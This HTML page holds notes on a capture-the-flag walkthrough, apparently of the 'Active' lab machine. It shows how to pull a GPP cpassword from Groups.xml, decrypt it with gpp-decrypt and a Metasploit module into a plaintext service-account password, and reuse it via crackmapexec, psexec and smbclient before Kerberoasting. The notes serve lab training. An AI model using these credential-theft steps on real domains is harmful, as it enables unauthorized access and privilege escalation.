<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>GPP/cPasswords</title>
</head><body><b>(2) GPP/cPasswords : <br/>
</b><br/>
Groups.xml contains GPP credentials : <br/>
<b>&nbsp; &#09;=&gt; &nbsp;Group Policy Preference<br/>
</b><b>&nbsp;&#09;=&gt; name / userName + cpassword</b><br/>
&nbsp;&#09; &nbsp;=&gt; Allows domain admin to create domain policies using embedded credentials<ul><b><li style="list-style-type: none">&nbsp;&#09;=&gt; Privilege escalation !</li>
<li style="list-style-type: none"></li>
</b></ul>
(GPP is low-hanging fruit, can be used as a bait to detect penetretation : canary account)<ul><b><li style="list-style-type: none"></li>
</b></ul>
See : https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/<br/>
<br/>
<u>(1) See into Groups.xml</u><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">- gedit active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml &amp;</li>
<li style="list-style-type: none"><img src="image 8.png" /></li>
<li style="list-style-type: none"><img src="image 7.png" /></li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">=&gt; GPP creds</li>
<li style="list-style-type: none">&nbsp;&#09; - name="active.htb\SVC_TGS"</li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">&nbsp;&#09;&#09;&#09;- userName="active.htb\SVC_TGS"</li>
<li style="list-style-type: none">&nbsp;&#09;&#09;&#09;- cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</li>
</ul>
<br/>
<ul><u><li style="list-style-type: none">(1.b) Alternative technique to get GPP/cpassword : metasploit</li>
</u><li style="list-style-type: none">&nbsp;- msfconsole</li>
<li style="list-style-type: none">&nbsp;&#09;&gt; search gpp</li>
<li style="list-style-type: none">&nbsp;&#09;&gt; use post/windows/gather/credentials/gpp</li>
<li style="list-style-type: none">&nbsp;&#09;&gt; options</li>
<li style="list-style-type: none">&nbsp;&#09;&gt; set session 1</li>
<li style="list-style-type: none"></li>
</ul>
<u>(2) Decrypt cpassword</u><ul><li style="list-style-type: none">&nbsp;- gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#09;<img src="image.png" /></li>
<li style="list-style-type: none">&nbsp;&#09;=&gt; GPPstillStandingStrong2k18</li>
<li style="list-style-type: none"></li>
</ul>
<u>(3) Try to get in anywhere we can with these credentials</u><ul><li style="list-style-type: none">- id : active.htb\SVC_TGS</li>
<li style="list-style-type: none">- pd : GPPstillStandingStrong2k18</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">=&gt; Try to login or pass credz around : </li>
<li style="list-style-type: none">- crakmapexec</li>
</ul>
</li>
</ul>
&nbsp;&#09;&#09;- psexec<br/>
&nbsp;&#09;&#09;- smb client login<br/>
&nbsp;&#09;&#09;...<br/>
<ul><b><li style="list-style-type: none"><u>Solution : Kerberoasting</u></li>
</b><li style="list-style-type: none"><img src="image 2.png" /></li>
<li style="list-style-type: none"></li>
</ul>
<br/>
<br/>
</body></html>